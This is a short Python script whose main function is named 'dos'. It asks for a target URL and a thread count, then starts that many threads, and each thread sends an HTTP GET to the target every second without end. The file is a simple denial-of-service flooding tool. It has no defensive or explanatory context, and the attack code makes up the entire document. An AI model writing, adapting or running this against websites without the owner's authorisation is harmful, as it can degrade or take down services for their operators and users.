import time
import threading
import requests
url = input("url: ")
load = (int)(input("load: "))
input()
def dos():
    while True:
        time.sleep(1)
        try:
            t = time.time()
            r = requests.get(url)
            print("Code: %s, %.2f s." % (r.status_code, time.time() - t))
        except:
            print('errLoad')
for i in range(load):
    try:
        threading.Thread(target=dos).start()
    except:
        print('errThread')

